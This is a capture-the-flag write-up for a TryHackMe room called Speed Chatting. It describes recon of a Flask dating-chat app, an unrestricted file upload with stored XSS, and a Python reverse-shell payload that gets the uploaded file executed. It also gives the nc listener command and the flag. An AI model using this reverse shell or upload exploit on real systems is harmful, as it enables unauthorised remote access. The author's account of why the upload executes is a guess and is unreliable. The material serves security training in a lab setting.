# Speed-Chatting
TryHackMe's Speed Chatting Walkthrough
TryHackMe – Speed Chatting (LoveConnect) Write-Up
Event: Love at First Breach 2026 (Valentine's CTF)
Room: Speed Chatting
Difficulty: Easy (but sneaky – took persistence!)
Date: February 17, 2026
Goal: Exploit the dating chat app to get a reverse shell and read the flag.
1. Situation / Recon

Target: http://some IP From Tryahackme:5000
Server: Werkzeug/3.1.5 Python/3.10.12 (Flask)
Nmap: Only ports 22 (SSH) and 5000 (HTTP) open
Homepage: LoveConnect – profile pic upload + speed chat room
Logged in as demo user (no auth form visible)
<img width="899" height="272" alt="image" src="https://github.com/user-attachments/assets/fcc4b19c-ac1a-4484-bd65-c71d55412dc2" />

2. Initial Enumeration

Dirb/ffuf: No obvious hidden endpoints except known /api/messages and /upload_profile_pic
Profile pic upload: POST to /upload_profile_pic, multipart/form-data, field profile_pic
Files stored in /uploads/profile_[uuid].[extension] – publicly accessible
Chat: GET /api/messages (JSON), POST /api/send_message (JSON {text})
Messages rendered with .textContent → no chat XSS
<img width="864" height="360" alt="image" src="https://github.com/user-attachments/assets/6af8f9c8-884e-4697-a151-deda2ff46d92" />



3. Vulnerability Discovery – Unrestricted File Upload

Upload accepted any file type (no mime check, no extension filter)
Original extension preserved + UUID prefix
Files served from /uploads/ with correct Content-Type (text/html for .html, text/x-python for .py, etc.)
Direct access to uploaded .html files executes JavaScript → stored XSS confirmed
.php and .py files served as raw text → no server-side execution on direct access

4. Exploitation Chain – Reverse Shell via Upload Execution
The key (not obvious from static serving):

The app executes uploaded .py files in a background process or misconfigured handler (likely exec(open(uploaded_path).read()) or similar rookie vuln)
Visiting the file URL does not trigger execution – but triggering happens via:
Refreshing profile page
Sending chat messages
Waiting 10–60 seconds (background worker/cron)


Payload (rev.py):
Pythonimport socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR KALI HOST IP ",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")

Upload: IT VIA THAT UPLOAD BUTTON

<img width="463" height="636" alt="image" src="https://github.com/user-attachments/assets/fb4793c6-99cb-4f35-a8b2-680db0cdb466" />


SETUP LISTENER Listener:
Bashrlwrap nc -lvnp 4444
Trigger:

Refresh main page ONCE 


Result:

Connection from target
Initial shell as root (or www-data) at /opt/Speed_Chat

NO NEED TO Stabilize shel

# /opt/Speed_Chat

ls 
# app.py  flag.txt  uploads

cat flag.txt
THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}


YOU MUST BE VERY FAST , SHELL CLOSES IN SECONDS OR SPLIT SECONDS
